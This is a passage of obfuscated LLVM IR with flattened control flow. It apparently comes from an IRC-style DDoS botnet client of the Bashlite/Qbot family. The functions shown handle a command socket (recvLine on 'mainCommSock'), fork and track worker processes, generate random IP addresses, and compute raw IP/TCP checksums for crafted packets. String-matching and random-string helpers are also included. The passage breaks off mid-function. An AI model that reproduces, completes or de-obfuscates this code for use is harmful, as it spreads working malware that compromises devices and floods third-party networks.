  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -92831414, label %4
    i32 1441181897, label %10
    i32 1400751006, label %13
    i32 1806374389, label %15
    i32 -1573221552, label %25
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:4:                                      ; preds = %loopEntry
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  %9 = select i1 %8, i32 1441181897, i32 1400751006
  store i32 %9, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i64, i64* %3, align 8
  %12 = icmp sge i64 %11, 0
  store i32 1400751006, i32* %switchVar
  store i1 %12, i1* %.reg2mem
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %14 = select i1 %.reload, i32 1806374389, i32 -1573221552
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i64, i64* %3, align 8
  %17 = shl i64 %16, 4
  %18 = load i8*, i8** %2, align 8
  %19 = getelementptr inbounds i8, i8* %18, i32 1
  store i8* %19, i8** %2, align 8
  %20 = load i8, i8* %18, align 1
  %21 = zext i8 %20 to i64
  %22 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %21
  %23 = load i64, i64* %22, align 8
  %24 = or i64 %17, %23
  store i64 %24, i64* %3, align 8
  store i32 -92831414, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i64, i64* %3, align 8
  ret i64 %26

loopEnd:                                          ; preds = %15, %13, %10, %4, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  store i32 %8, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -912163571, i32* %switchVar
  %.reg2mem12 = alloca i1
  %.reg2mem14 = alloca i1
  %.reg2mem16 = alloca i1
  %.reg2mem18 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar7 = load i32, i32* %switchVar
  switch i32 %switchVar7, label %switchDefault [
    i32 -912163571, label %NodeBlock5
    i32 -698593090, label %NodeBlock
    i32 704640355, label %LeafBlock3
    i32 -1508936042, label %LeafBlock1
    i32 981578503, label %LeafBlock
    i32 1533619134, label %14
    i32 1509998403, label %18
    i32 660392972, label %25
    i32 1294375844, label %31
    i32 -701090508, label %38
    i32 1700223354, label %39
    i32 1044686252, label %42
    i32 -1161476614, label %48
    i32 1215483284, label %56
    i32 -1295730811, label %NewDefault
    i32 -529424187, label %59
    i32 -2075129681, label %70
    i32 2021038905, label %78
    i32 1833473318, label %81
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload11 = load volatile i32, i32* %.reg2mem
  %Pivot6 = icmp slt i32 %.reload11, 42
  %9 = select i1 %Pivot6, i32 981578503, i32 -698593090
  store i32 %9, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload9 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload9, 63
  %10 = select i1 %Pivot, i32 -1508936042, i32 704640355
  store i32 %10, i32* %switchVar
  br label %loopEnd

LeafBlock3:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf4 = icmp eq i32 %.reload, 63
  %11 = select i1 %SwitchLeaf4, i32 1044686252, i32 -1295730811
  store i32 %11, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload8 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload8, 42
  %12 = select i1 %SwitchLeaf2, i32 1509998403, i32 -1295730811
  store i32 %12, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload10 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf = icmp eq i32 %.reload10, 0
  %13 = select i1 %SwitchLeaf, i32 1533619134, i32 -1295730811
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  store i32 %17, i32* %3, align 4
  store i32 1833473318, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = getelementptr inbounds i8, i8* %19, i64 1
  %21 = load i8*, i8** %5, align 8
  %22 = call i32 @wildString(i8* %20, i8* %21)
  %23 = icmp ne i32 %22, 0
  %24 = select i1 %23, i32 660392972, i32 1700223354
  store i32 %24, i32* %switchVar
  store i1 true, i1* %.reg2mem14
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i8*, i8** %5, align 8
  %27 = load i8, i8* %26, align 1
  %28 = zext i8 %27 to i32
  %29 = icmp ne i32 %28, 0
  %30 = select i1 %29, i32 1294375844, i32 -701090508
  store i32 %30, i32* %switchVar
  store i1 false, i1* %.reg2mem12
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i8*, i8** %4, align 8
  %33 = load i8*, i8** %5, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 1
  %35 = call i32 @wildString(i8* %32, i8* %34)
  %36 = icmp ne i32 %35, 0
  %37 = xor i1 %36, true
  store i32 -701090508, i32* %switchVar
  store i1 %37, i1* %.reg2mem12
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload13 = load i1, i1* %.reg2mem12
  store i32 1700223354, i32* %switchVar
  store i1 %.reload13, i1* %.reg2mem14
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %.reload15 = load i1, i1* %.reg2mem14
  %40 = xor i1 %.reload15, true
  %41 = zext i1 %40 to i32
  store i32 %41, i32* %3, align 4
  store i32 1833473318, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %5, align 8
  %44 = load i8, i8* %43, align 1
  %45 = zext i8 %44 to i32
  %46 = icmp ne i32 %45, 0
  %47 = select i1 %46, i32 -1161476614, i32 1215483284
  store i32 %47, i32* %switchVar
  store i1 false, i1* %.reg2mem16
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i8*, i8** %4, align 8
  %50 = getelementptr inbounds i8, i8* %49, i64 1
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = call i32 @wildString(i8* %50, i8* %52)
  %54 = icmp ne i32 %53, 0
  %55 = xor i1 %54, true
  store i32 1215483284, i32* %switchVar
  store i1 %55, i1* %.reg2mem16
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %.reload17 = load i1, i1* %.reg2mem16
  %57 = xor i1 %.reload17, true
  %58 = zext i1 %57 to i32
  store i32 %58, i32* %3, align 4
  store i32 1833473318, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 -529424187, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i8*, i8** %4, align 8
  %61 = load i8, i8* %60, align 1
  %62 = zext i8 %61 to i32
  %63 = call i32 @toupper(i32 %62) #10
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = call i32 @toupper(i32 %66) #10
  %68 = icmp eq i32 %63, %67
  %69 = select i1 %68, i32 -2075129681, i32 2021038905
  store i32 %69, i32* %switchVar
  store i1 false, i1* %.reg2mem18
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i8*, i8** %4, align 8
  %72 = getelementptr inbounds i8, i8* %71, i64 1
  %73 = load i8*, i8** %5, align 8
  %74 = getelementptr inbounds i8, i8* %73, i64 1
  %75 = call i32 @wildString(i8* %72, i8* %74)
  %76 = icmp ne i32 %75, 0
  %77 = xor i1 %76, true
  store i32 2021038905, i32* %switchVar
  store i1 %77, i1* %.reg2mem18
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %.reload19 = load i1, i1* %.reg2mem18
  %79 = xor i1 %.reload19, true
  %80 = zext i1 %79 to i32
  store i32 %80, i32* %3, align 4
  store i32 1833473318, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i32, i32* %3, align 4
  ret i32 %82

loopEnd:                                          ; preds = %78, %70, %59, %NewDefault, %56, %48, %42, %39, %38, %31, %25, %18, %14, %LeafBlock, %LeafBlock1, %LeafBlock3, %NodeBlock, %NodeBlock5, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %switchVar = alloca i32
  store i32 499500484, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 499500484, label %3
    i32 1944248329, label %8
    i32 -1634035142, label %17
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:3:                                      ; preds = %loopEntry
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  %7 = select i1 %6, i32 1944248329, i32 -1634035142
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i8*, i8** %2, align 8
  %10 = load i8, i8* %9, align 1
  %11 = zext i8 %10 to i32
  %12 = call i32 @toupper(i32 %11) #10
  %13 = trunc i32 %12 to i8
  %14 = load i8*, i8** %2, align 8
  store i8 %13, i8* %14, align 1
  %15 = load i8*, i8** %2, align 8
  %16 = getelementptr inbounds i8, i8* %15, i32 1
  store i8* %16, i8** %2, align 8
  store i32 499500484, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %8, %3, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  %switchVar = alloca i32
  store i32 -3682749, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -3682749, label %6
    i32 460849089, label %11
    i32 781925272, label %20
    i32 -945446545, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  %10 = select i1 %9, i32 460849089, i32 -945446545
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = call i32 @rand_cmwc()
  %13 = urem i32 %12, 26
  %14 = add i32 %13, 65
  %15 = trunc i32 %14 to i8
  %16 = load i8*, i8** %3, align 8
  %17 = load i32, i32* %5, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  store i8 %15, i8* %19, align 1
  store i32 781925272, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %5, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %5, align 4
  store i32 -3682749, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %20, %11, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  %switchVar = alloca i32
  store i32 1516615158, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1516615158, label %24
    i32 643040619, label %33
    i32 -156135607, label %50
    i32 -1672726792, label %51
    i32 -430183052, label %55
    i32 1667977582, label %60
    i32 -944696809, label %69
    i32 2020605594, label %86
    i32 -1907697848, label %89
    i32 130126657, label %90
    i32 -588480964, label %91
    i32 252237746, label %93
    i32 -1086893390, label %98
    i32 -2084262995, label %103
    i32 -1525479039, label %105
    i32 399341754, label %113
    i32 296809830, label %114
    i32 -1132931982, label %117
    i32 1686410999, label %120
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #2, !srcloc !2
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  store i32 643040619, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  %49 = select i1 %48, i32 -156135607, i32 -588480964
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  store i32 -1672726792, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = load i32, i32* %13, align 4
  %53 = icmp slt i32 %52, 10
  %54 = select i1 %53, i32 -430183052, i32 130126657
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32, i32* @mainCommSock, align 4
  %57 = call i32 (i32, i8*, ...) @sockprintf(i32 %56, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0))
  %58 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %58, align 8
  %59 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %59, align 8
  store i32 1667977582, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %62 = getelementptr inbounds [16 x i64], [16 x i64]* %61, i64 0, i64 0
  %63 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %62) #2, !srcloc !3
  %64 = extractvalue { i64, i64* } %63, 0
  %65 = extractvalue { i64, i64* } %63, 1
  %66 = trunc i64 %64 to i32
  store i32 %66, i32* %14, align 4
  %67 = ptrtoint i64* %65 to i64
  %68 = trunc i64 %67 to i32
  store i32 %68, i32* %15, align 4
  store i32 -944696809, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %5, align 4
  %71 = srem i32 %70, 64
  %72 = zext i32 %71 to i64
  %73 = shl i64 1, %72
  %74 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %75 = load i32, i32* %5, align 4
  %76 = sdiv i32 %75, 64
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds [16 x i64], [16 x i64]* %74, i64 0, i64 %77
  %79 = load i64, i64* %78, align 8
  %80 = or i64 %79, %73
  store i64 %80, i64* %78, align 8
  %81 = load i32, i32* %5, align 4
  %82 = add nsw i32 %81, 1
  %83 = call i32 @select(i32 %82, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %83, i32* %12, align 4
  %84 = icmp sle i32 %83, 0
  %85 = select i1 %84, i32 2020605594, i32 -1907697848
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* %13, align 4
  %88 = add nsw i32 %87, 1
  store i32 %88, i32* %13, align 4
  store i32 -1672726792, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 130126657, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 -588480964, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 0, i32* %18, align 4
  %92 = load i8*, i8** %6, align 8
  store i8* %92, i8** %17, align 8
  store i32 252237746, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i32, i32* %7, align 4
  %95 = add nsw i32 %94, -1
  store i32 %95, i32* %7, align 4
  %96 = icmp sgt i32 %94, 1
  %97 = select i1 %96, i32 -1086893390, i32 -1132931982
  store i32 %97, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i32, i32* @mainCommSock, align 4
  %100 = call i64 @recv(i32 %99, i8* %16, i64 1, i32 0)
  %101 = icmp ne i64 %100, 1
  %102 = select i1 %101, i32 -2084262995, i32 -1525479039
  store i32 %102, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i8*, i8** %17, align 8
  store i8 0, i8* %104, align 1
  store i32 -1, i32* %4, align 4
  store i32 1686410999, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i8, i8* %16, align 1
  %107 = load i8*, i8** %17, align 8
  %108 = getelementptr inbounds i8, i8* %107, i32 1
  store i8* %108, i8** %17, align 8
  store i8 %106, i8* %107, align 1
  %109 = load i8, i8* %16, align 1
  %110 = zext i8 %109 to i32
  %111 = icmp eq i32 %110, 10
  %112 = select i1 %111, i32 399341754, i32 296809830
  store i32 %112, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  store i32 -1132931982, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32, i32* %18, align 4
  %116 = add nsw i32 %115, 1
  store i32 %116, i32* %18, align 4
  store i32 252237746, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i8*, i8** %17, align 8
  store i8 0, i8* %118, align 1
  %119 = load i32, i32* %18, align 4
  store i32 %119, i32* %4, align 4
  store i32 1686410999, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %4, align 4
  ret i32 %121

loopEnd:                                          ; preds = %117, %114, %113, %105, %103, %98, %93, %91, %90, %89, %86, %69, %60, %55, %51, %50, %33, %24, %switchDefault
  br label %loopEntry
}

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  store i32 %6, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -2033455621, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -2033455621, label %first
    i32 1916329667, label %9
    i32 1682495580, label %11
    i32 -185034938, label %19
    i32 1677144047, label %26
    i32 153297051, label %36
    i32 -1402771006, label %39
    i32 159191337, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %7 = icmp ule i32 %.reload, 0
  %8 = select i1 %7, i32 1916329667, i32 1682495580
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %2, align 4
  store i32 %10, i32* %1, align 4
  store i32 159191337, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i64, i64* @numpids, align 8
  %13 = add i64 %12, 1
  store i64 %13, i64* @numpids, align 8
  %14 = load i64, i64* @numpids, align 8
  %15 = add i64 %14, 1
  %16 = mul i64 %15, 4
  %17 = call noalias i8* @malloc(i64 %16) #2
  %18 = bitcast i8* %17 to i32*
  store i32* %18, i32** %3, align 8
  store i32 0, i32* %4, align 4
  store i32 -185034938, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = zext i32 %20 to i64
  %22 = load i64, i64* @numpids, align 8
  %23 = sub i64 %22, 1
  %24 = icmp ult i64 %21, %23
  %25 = select i1 %24, i32 1677144047, i32 -1402771006
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i32*, i32** @pids, align 8
  %28 = load i32, i32* %4, align 4
  %29 = zext i32 %28 to i64
  %30 = getelementptr inbounds i32, i32* %27, i64 %29
  %31 = load i32, i32* %30, align 4
  %32 = load i32*, i32** %3, align 8
  %33 = load i32, i32* %4, align 4
  %34 = zext i32 %33 to i64
  %35 = getelementptr inbounds i32, i32* %32, i64 %34
  store i32 %31, i32* %35, align 4
  store i32 153297051, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %4, align 4
  %38 = add i32 %37, 1
  store i32 %38, i32* %4, align 4
  store i32 -185034938, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %2, align 4
  %41 = load i32*, i32** %3, align 8
  %42 = load i64, i64* @numpids, align 8
  %43 = sub i64 %42, 1
  %44 = getelementptr inbounds i32, i32* %41, i64 %43
  store i32 %40, i32* %44, align 4
  %45 = load i32*, i32** @pids, align 8
  %46 = bitcast i32* %45 to i8*
  call void @free(i8* %46) #2
  %47 = load i32*, i32** %3, align 8
  store i32* %47, i32** @pids, align 8
  %48 = load i32, i32* %2, align 4
  store i32 %48, i32* %1, align 4
  store i32 159191337, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  ret i32 %50

loopEnd:                                          ; preds = %39, %36, %26, %19, %11, %9, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @GetRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  %switchVar = alloca i32
  store i32 -386993072, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -386993072, label %6
    i32 -87484444, label %10
    i32 355656105, label %19
    i32 -144161352, label %23
    i32 -2020554710, label %30
    i32 -2097039346, label %31
    i32 -51766141, label %36
    i32 1511828832, label %42
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  %9 = select i1 %8, i32 -87484444, i32 355656105
  store i32 %9, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i16*, i16** %3, align 8
  %12 = getelementptr inbounds i16, i16* %11, i32 1
  store i16* %12, i16** %3, align 8
  %13 = load i16, i16* %11, align 2
  %14 = zext i16 %13 to i64
  %15 = load i64, i64* %5, align 8
  %16 = add i64 %15, %14
  store i64 %16, i64* %5, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sub nsw i32 %17, 2
  store i32 %18, i32* %4, align 4
  store i32 -386993072, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = icmp sgt i32 %20, 0
  %22 = select i1 %21, i32 -144161352, i32 -2020554710
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i16*, i16** %3, align 8
  %25 = bitcast i16* %24 to i8*
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i64
  %28 = load i64, i64* %5, align 8
  %29 = add i64 %28, %27
  store i64 %29, i64* %5, align 8
  store i32 -2020554710, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  store i32 -2097039346, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i64, i64* %5, align 8
  %33 = lshr i64 %32, 16
  %34 = icmp ne i64 %33, 0
  %35 = select i1 %34, i32 -51766141, i32 1511828832
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i64, i64* %5, align 8
  %38 = and i64 %37, 65535
  %39 = load i64, i64* %5, align 8
  %40 = lshr i64 %39, 16
  %41 = add i64 %38, %40
  store i64 %41, i64* %5, align 8
  store i32 -2097039346, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i64, i64* %5, align 8
  %44 = xor i64 %43, -1
  %45 = trunc i64 %44 to i16
  ret i16 %45

loopEnd:                                          ; preds = %36, %31, %30, %23, %19, %10, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
